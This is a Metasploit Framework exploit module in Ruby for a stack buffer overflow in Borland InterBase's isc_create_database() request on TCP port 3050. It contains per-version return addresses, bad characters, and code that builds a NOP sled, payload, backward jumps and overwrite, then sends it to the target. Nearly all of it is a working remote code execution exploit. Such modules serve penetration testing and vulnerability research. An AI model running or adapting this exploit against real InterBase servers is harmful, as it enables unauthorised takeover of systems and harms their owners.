##
# $Id: ib_isc_create_database.rb 5136 2007-10-04 03:03:13Z ramon $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'

module Msf

class Exploits::Windows::Misc::Ib_Isc_Create_Database < Msf::Exploit::Remote

	include Exploit::Remote::Tcp
	include Exploit::Remote::BruteTargets

	def initialize(info = {})
		super(update_info(info,
			'Name'		=> 'Borland InterBase isc_create_database() Buffer Overflow',
			'Description'	=> %q{
				This module exploits a stack overflow in Borland InterBase
				by sending a specially crafted create request.
			},
			'Version'	=> '$Revision: 5136 $',
			'Author'	=>
				[
					'Ramon de Carvalho Valle <ramon@risesecurity.org>',
					'Adriano Lima <adriano@risesecurity.org>',
				],
			'Arch'		=> ARCH_X86,
			'Platform'	=> 'win',
			'References'	=>
				[
					[ 'URL', 'http://risesecurity.org/advisory/RISE-2007002/' ],
				],
			'Privileged'	=> true,
			'License'	=> MSF_LICENSE,
			'Payload'	=>
				{
					'Space' => 512,
					'BadChars' => "\x00\x2f\x3a\x40\x5c",
					'StackAdjustment' => -3500,
				},
			'Targets'	=>
				[
					[ 'Brute Force', { } ],
					# 0x00403d4b pop esi; pop ebp; ret
					[
						'Borland InterBase WI-V8.1.0.257',
						{ 'Length' => [ 2116, 2120 ], 'Ret' => 0x00403d4b }
					],
					# 0x00403d4d pop esi; pop ebp; ret
					[
						'Borland InterBase WI-V8.0.0.123',
						{ 'Length' => [ 2116, 2120 ], 'Ret' => 0x00403d4d }
					],
					# 0x00403a5d pop esi; pop ebp; ret
					[
						'Borland InterBase WI-V7.5.0.129 WI-V7.5.1.80',
						{ 'Length' => [ 2116, 2120 ], 'Ret' => 0x00403a5d }
					],
					# 0x004038fd pop esi; pop ebp; ret
					[
						'Borland InterBase WI-V7.0.1.1',
						{ 'Length' => [ 2116, 2120 ], 'Ret' => 0x004038fd }
					],
					# 0x0040390d pop esi; pop ebp; ret
					[
						'Borland InterBase WI-V6.5.0.28',
						{ 'Length' => [ 1332, 1336 ], 'Ret' => 0x0040390d }
					],
					# 0x00403901 pop esi; pop ebp; ret
					[
						'Borland InterBase WI-V6.0.1.6',
						{ 'Length' => [ 1332, 1336 ], 'Ret' => 0x00403901 }
					],
					# 0x004038b1 pop esi; pop ebp; ret
					[
						'Borland InterBase WI-V6.0.0.627 WI-V6.0.1.0 WI-O6.0.1.6 WI-O6.0.2.0',
						{ 'Length' => [ 1332, 1336 ], 'Ret' => 0x004038b1 }
					],
					# 0x00404a10 pop esi; pop ebp; ret
					[
						'Borland InterBase WI-V5.5.0.742',
						{ 'Length' => [ 1432, 1436 ], 'Ret' => 0x00404a10 }
					],
					# 0x00404a0e pop esi; pop ebp; ret
					[
						'Borland InterBase WI-V5.1.1.680',
						{ 'Length' => [ 1336, 1340 ], 'Ret' => 0x00404a0e }
					],
					# Debug
					[
						'Debug',
						{ 'Length' => [ 1336 ], 'Ret' => 0xaabbccdd }
					],
				],
			'DefaultTarget'	=> 0
		))

		register_options(
			[
				Opt::RPORT(3050)
			],
			self.class
		)

	end

	def exploit_target(target)

		target['Length'].each do |length|

			connect

			# Create database
			op_create = 20

			remainder = length.remainder(4)
			padding = 0

			if remainder > 0
				padding = (4 - remainder)
			end

			buf = ''

			# Operation/packet type
			buf << [op_create].pack('N')

			# Id
			buf << [0].pack('N')

			# Length
			buf << [length].pack('N')

			# Nop block
			buf << make_nops(length - payload.encoded.length - 13)

			# Payload
			buf << payload.encoded

			# Jump back into the nop block
			buf << "\xe9" + [-1028].pack('V')

			# Jump back
			buf << "\xeb" + [-7].pack('c')

			# Random alpha data
			buf << rand_text_alpha(2)

			# Target
			buf << [target.ret].pack('V')

			# Padding
			buf << "\x00" * padding

			# Database parameter block

			# Length
			buf << [1024].pack('N')

			# Random alpha data
			buf << rand_text_alpha(1024)

			sock.put(buf)

			sleep(4)

			handler

		end

	end

end

end

